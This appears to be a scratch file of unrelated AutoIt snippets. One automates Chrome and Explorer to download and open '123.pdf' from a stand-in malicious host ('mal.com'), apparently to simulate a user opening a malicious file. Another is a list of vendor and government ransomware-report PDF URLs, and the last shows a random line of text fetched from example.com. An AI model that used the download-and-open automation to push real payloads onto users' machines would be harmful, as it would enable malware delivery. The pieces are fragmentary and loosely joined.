; Function to download the file using Chrome
Func DownloadFileWithChrome($url)
    ; Open Chrome and navigate to the URL
    Run("chrome.exe " & $url)
    Sleep(5000) ; Wait for Chrome to open and load the URL

    ; Wait for the download to complete (assuming default download location and auto-download setting)
    Sleep(10000) ; Adjust the sleep time if needed

    ; Close Chrome
    ProcessClose("chrome.exe")
EndFunc

; Main script

; Step 1: Download the PDF file using Chrome
DownloadFileWithChrome("https://mal.com/123.pdf")

; Step 2: Open explorer.exe
Run("explorer.exe")
Sleep(2000)

; Step 3: Navigate to the Downloads folder
Send("#r")
Sleep(500)
Send(@UserProfileDir & "\Downloads{ENTER}")
Sleep(2000)

; Step 4: Open 123.pdf file
Send("123.pdf{ENTER}")
Sleep(5000) ; Adjust the sleep time if needed

; Step 5: Close the PDF file (assuming default PDF viewer)
Send("!{F4}")
Sleep(1000)

; Step 6: Close the Windows Explorer window
Send("!{F4}")

    "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/datasheets/pa-7000-series-ml-powered-next-gen-firewalls.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/digital-transformation-security.pdf",
    "https://www.paloaltonetworks.com/resources/ebooks/cloud-security-for-dummies.pdf",
    "https://www.paloaltonetworks.com/resources/guides/secure-access-service-edge-sase.pdf",
    "https://www.paloaltonetworks.com/resources/guides/zero-trust-cybersecurity.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/the-essential-guide-to-security-operations.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/protecting-iot-and-ot-infrastructure.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/saas-security-guide.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/next-gen-firewalls.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/ultimate-guide-to-cybersecurity.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/cortex-xdr.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/embracing-the-cloud-with-confidence.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/cloud-native-security.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/cybersecurity-predictions-2024.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/remote-work-security.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/iot-security-comprehensive-guide.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/security-for-healthcare-industries.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/financial-services-cybersecurity.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/government-cybersecurity-strategies.pdf",
    "https://www.paloaltonetworks.com/resources/whitepapers/ransomware-defense-strategies.pdf"
    "https://ransomware.org/wp-content/uploads/2024/03/2024-State-of-Ransomware-Report_v1.pdf"
    "https://privacy.blackfog.com/wp-content/uploads/2024/02/BlackFogRansomwareReport-Jan-2024.pdf"
    "https://www.ftc.gov/system/files/ftc_gov/pdf/ftc_ransomware_report_oct_2023.pdf"
"https://www.dhs.gov/sites/default/files/2023-09/23_0913_ia_23-333-ia_u_homeland-threat-assessment-2024_508C_V6_13Sep23.pdf"
"https://www.hhs.gov/sites/default/files/akira-randsomware-analyst-note-feb2024.pdf"
"https://www.bl.uk/home/british-library-cyber-incident-review-8-march-2024.pdf"
"https://chatgpt.com/c/eb8af37d-6b41-4da8-b909-086a45fa5c20#:~:text=BlackFog%20State%20of%20Ransomware%20Report%20January%202024"


#include <Inet.au3>
#include <Array.au3>
#include <MsgBoxConstants.au3>

; URL of the website to read text from
Local $url = "http://example.com/sampletext.txt"

; Read the content of the website
Local $sData = _INetGetSource($url)

; Check if data was successfully retrieved
If @error Then
    MsgBox($MB_SYSTEMMODAL, "Error", "Failed to retrieve data from the website.")
    Exit
EndIf

; Parse the content by delimiter (comma)
Local $aArray = StringSplit($sData, ",")

; Check if the parsing was successful
If @error Then
    MsgBox($MB_SYSTEMMODAL, "Error", "Failed to parse the content.")
    Exit
EndIf

; Remove the first element of the array which contains the count of elements
_ArrayDelete($aArray, 0)

; Pick a random line from the array
Local $iRandomIndex = Random(1, UBound($aArray) - 1, 1)

; Display the randomly picked line
MsgBox($MB_SYSTEMMODAL, "Random Line", $aArray[$iRandomIndex])
